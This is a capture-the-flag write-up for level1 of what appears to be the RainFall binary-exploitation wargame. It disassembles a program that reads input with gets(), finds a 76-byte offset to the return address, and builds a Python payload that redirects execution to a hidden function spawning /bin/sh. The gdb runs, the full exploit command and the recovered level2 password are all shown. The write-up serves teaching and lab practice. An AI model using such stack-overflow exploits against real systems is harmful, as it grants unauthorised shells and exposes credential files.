
### notes
```c
0x08048444  run : function not called in main
0x08048480  main

```

### 0x08048480 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
{
    int argc = ebp+0x8
    char **argv = ebp+12

    char *buffer1[80-16=64] = esp+16
}
```
* __`<0> -> <+6> : prepare stack frame for n function with size 80`__
```c
0x08048480 <+0>:	push   ebp
0x08048481 <+1>:	mov    ebp,esp
0x08048483 <+3>:	and    esp,0xfffffff0
0x08048486 <+6>:	sub    esp,80
```
* __`<+9> -> <+16> : take input from user and save it into buffer1 using gets()`__
```c
0x08048489 <+9>:	lea    eax,[buffer1]
0x0804848d <+13>:	mov    DWORD PTR [esp],eax
0x08048490 <+16>:	call   0x8048340 <gets@plt>
```
* __`<+21> -> <+22> : exit the main function`__
```c
0x08048495 <+21>:	leave  
0x08048496 <+22>:	ret 
```
### Stack Illustration (main function)
with the following input
`A * 76 + B * 4`
```shell
+-------------------+ 
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ] <--- EIP      BBBB <- offset of buffer Overflow
+-------------------+ +4            AAAA <- A * 76 times
[      OLD_EBP      ]               AAAA
+-------------------+ <---EBP       AAAA 
[and esp,0xfffffff0 ] <--- stack alignement 
+-------------------+               AAAA
[      AAAA         ]               AAAA
+-------------------+ +80  <------+ AAAA   ^
[      AAAA         ]             | AAAA   |
+-------------------+ +76         | AAAA   |
[      AAAA         ]             | AAAA
+-------------------+ +72         | AAAA
          *                       | AAAA
          *                       |----- size of buffer1 = 64 = (80 - 16)
          *                       | AAAA
+-------------------+ +24         | AAAA
[      AAAA         ]             | AAAA
+-------------------+ +20         | AAAA
[ start of buffer1  ]             | AAAA
+-------------------+ +16  <------+
[                   ]       
+-------------------+ +12         
[                   ]             
+-------------------+ +8           
[                   ]               
+-------------------+ +4          
[                   ]      
+-------------------+ <---ESP
```

### 0x08048444 : run() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
// 0x18 ... 24
// 0x13 ... 19
```
* __`<0> -> <+3> : prepare stack frame for n function with size 24`__
```c
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,24
```
* __`<+6> -> <+41> : print "Good... Wait what?\n" on the screen with fwrite`__
```c
0x0804844a <+6>:	mov    eax,ds:0x80497c0 // stdout
0x0804844f <+11>:	mov    edx,eax
0x08048451 <+13>:	mov    eax,0x8048570 // "Good... Wait what?\n"
0x08048456 <+18>:	mov    DWORD PTR [esp+12],edx
0x0804845a <+22>:	mov    DWORD PTR [esp+8],19
0x08048462 <+30>:	mov    DWORD PTR [esp+4],1
0x0804846a <+38>:	mov    DWORD PTR [esp],eax
0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
fwrite("Good... Wait what?\n", 1, 19, stdout)
```
* __`<+46> -> <+53> : call the shell process with system("/bin/sh")`__
```c
0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 // "/bin/sh"
0x08048479 <+53>:	call   0x8048360 <system@plt> // system("/bin/sh")
```
* __`<+58> -> <+59> : leave the function/ quit the function`__
```c
0x0804847e <+58>:	leave  
0x0804847f <+59>:	ret 
```
### Stack Illustration

```c
+-------------------+ 
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ]
+-------------------+ +4
[      OLD_EBP      ]
+-------------------+ <---EBP
[and esp,0xfffffff0 ] <--- stack alignement 
+-------------------+ +24
[                   ]
[                   ] +24
[                   ]
[                   ] +20
[                   ] 
+-------------------+ +16
[       stdout      ]       
+-------------------+ +12         
[         19        ]             
+-------------------+ +8          
[          1        ]               
+-------------------+ +4          
[     "/bin/sh"     ]   <---  after caling system / before : will be  "Good... Wait what?\n"  
+-------------------+ <---ESP
```
### Code Prediction 
```c
function run () {

    fwrite("Good... Wait what?\n", 1, 19, stdout);

    system("/bin/sh");

    return ;

}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {

    const buffer[64];

    gets(buffer);

    return;
}
```
### Process of the Exploit

- lets find the offset where the program will buffer overflow :
- using the [online tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
- we get the pattern generated there and send it to programm in GDB
`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A` (length : 100)
```c
Starting program: /home/user/level1/level1 <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x63413563 in ?? ()
(gdb)
```
- we can notice that the program segfaulted, showing that `0x63413563` is unknown , which says that the EIP address is overwritten by `0x63413563`
- ok good, lets take address back to the online tool and see what it says
- by entering the address in the __Register value__ input the offset will display __76__
- ok , the buffer overflow offset is : __76__
- lets genereate another costum pattern to have a clear idea about the exploit
`python -c 'print "A" * 76 + "BBBB" '`
- lets try it in gdb , its should segfault in 0x42424242:
```c
(gdb) run <<< $(python -c 'print "A" * 76 + "BBBB" ')
Starting program: /home/user/level1/level1 <<< $(python -c 'print "A" * 76 + "BBBB" ')

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x42424242 in ?? ()
(gdb)
```
- exactly as expected
- now we need to change this address of BBBB with a valid address that will help us reach the end goal which is accessing the shell
- what we need exists in the function RUN but its not called, 
- lets redirect the execution of the program to the function
- by __changing__ the __EIP__ in the main __from return__ address __to run__ address  by replacing BBBB with the __little endian__ format of the __run functiona address__
- run address : `0x08048444`
- run address in little endian : `\x44\x84\x04\x08`
- run address in little endian with python : `print "\x08\x04\x84\x44"[::-1]`
```c
(gdb) run <<< $(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ')
Starting program: /home/user/level1/level1 <<< $(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ')
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x00000000 in ?? ()
```
- run function has been executed
---
### Solution :

```shell
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ') > /tmp/ok
level1@RainFall:~$ cat /tmp/ok | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 
```
- segfault error because the stdin is closed right away after the execution
- to avoid that we add a `-` after cat to keep the stdin open
```shell
level1@RainFall:~$ cat /tmp/ok - | ./level1 
Good... Wait what?
whoami
level2
pwd
/home/user/level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
we got the flag : `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

---

### Ressources :
- __[Buffer overflow, explained well honestly (VIDEO)](https://youtu.be/btkuAEbcQ80)__

- [Buffer Overflow Examples, Overwriting a function pointer - protostar stack3 (ARTICLE)](https://0xrick.github.io/binary-exploitation/bof3/)
- [Call function in buffer overflow (stackoverflow)(ARTICLE)](https://stackoverflow.com/questions/30419081/call-function-in-buffer-overflow)
- [What is buffer overflow? (ARTICLE)](https://www.cloudflare.com/learning/security/threats/buffer-overflow/)
- [what is buffer overflow (VIDEO)](https://youtu.be/1S0aBV-Waeo)
- [Writing a Simple Buffer Overflow Exploit (VIDEO)](https://youtu.be/oS2O75H57qU)
